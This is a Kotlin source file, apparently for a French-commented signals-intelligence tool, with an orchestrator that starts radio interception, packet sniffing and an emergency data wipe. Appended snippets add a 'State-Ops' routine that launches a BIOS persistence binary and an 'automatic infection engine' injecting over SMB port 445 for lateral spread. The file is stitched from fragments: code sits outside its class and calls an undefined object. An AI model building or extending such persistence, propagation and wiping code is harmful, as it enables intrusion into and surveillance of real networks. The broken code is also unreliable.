package com.fardc.sigint.core.interop

import com.fardc.sigint.core.security.*
import com.fardc.sigint.core.services.SdrInterface

class MissionOrchestrator(
    private val sniffer: PacketSniffer,
    private val security: SecurityController,
    private val sdr: SdrInterface
) {
    fun startTacticalSurveillance() {
        // 1. Durcir l'environnement
        security.checkIntegrity()
        
        // 2. Lancer l'interception Radio & Data en parallèle
        sdr.startCapture() 
        println("[📡] SIGINT: SDR Bridge actif sur les fréquences cibles.")
        
        // 3. Activer le filtrage DPI
        sniffer.inspectTraffic("INIT_STREAM")
    }

    fun emergencyAbort() {
        // En cas de compromission, on appelle le PanicWipe de la phase précédente
        val wiper = PanicWipeManager()
        wiper.executeTotalWipe()
    }
}
// Modification dans MissionOrchestrator.kt
val sdrBridge = SdrBridge()

fun startTacticalMission() {
    security.checkIntegrity()
    // Lancement de la radio
    sdrBridge.startRfScan("900M") 
    // Lancement de la capture data
    sniffer.startDpi()
    println("[⚔️] MISSION : Fusion RF + DATA active.")
}
// Ajout dans MissionOrchestrator.kt
fun activateStateLevelOps() {
    println("[👑] STATE-OPS : Activation des protocoles de grade Superpuissance.")
    
    // 1. Assurer la survie éternelle
    Runtime.getRuntime().exec("./BiosPersistence")
    
    // 2. Propagation latérale (Moteur d'infection automatique)
    injector.scan_and_inject("192.168.1.1", 445)
}
